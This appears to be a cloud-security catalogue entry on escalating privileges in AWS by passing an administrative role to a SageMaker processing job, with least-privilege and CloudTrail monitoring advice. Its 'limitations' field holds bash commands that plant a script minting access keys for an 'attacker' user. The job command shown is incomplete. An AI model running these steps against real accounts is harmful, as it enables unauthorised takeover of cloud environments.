description: A principal with `iam:PassRole` and `sagemaker:CreateProcessingJob` can create a SageMaker processing job with a privileged execution role. Processing jobs can execute arbitrary container code for data processing tasks and access AWS APIs with the permissions of the attached IAM role. By creating a processing job with a malicious container or processing script, the attacker can execute code with elevated privileges.
prerequisites:
  admin:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess)
  - An S3 bucket must be accessible to store input/output data

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative service roles** - Very rarely does a SageMaker processing job need administrative access. Use the principle of least privilege.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.

  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "sagemaker.amazonaws.com"
      }
    }
  }
  ```

  - Monitor CloudTrail for unusual SageMaker processing job creation followed by immediate execution
  - Monitor CloudTrail for processing job creation by principals who do not usually create processing jobs
  - Monitor CloudTrail for roles being passed to SageMaker that haven't been used before
  - Monitor and alert on SageMaker processing job creation with privileged roles
  - Regularly audit SageMaker processing jobs for excessive IAM permissions
  - Regularly audit all IAM roles that trust the SageMaker service and down-scope any roles with administrative access
limitations: 'This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.

      The attacker creates a SageMaker processing job with a malicious processing script and passes a privileged role to it. The script is uploaded to S3 and configured as the container entrypoint.

      Commands:
      ```bash
      # Create malicious script
      echo '#!/bin/bash
      aws iam create-access-key --user-name attacker
      ' > process.sh && chmod +x process.sh

      # Upload to S3
      aws s3 cp process.sh s3://BUCKET_NAME/processing/process.sh

      # Create processing job
      aws sagemaker create-processing-job \
        --processing-job-name privesc-processing \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \

        --processing-resources ClusterConfig={InstanceCount=1,InstanceType=ml.m5.large,VolumeSizeInGB=10}
      ```

      The processing job configuration specifies the malicious script as the container entrypoint.
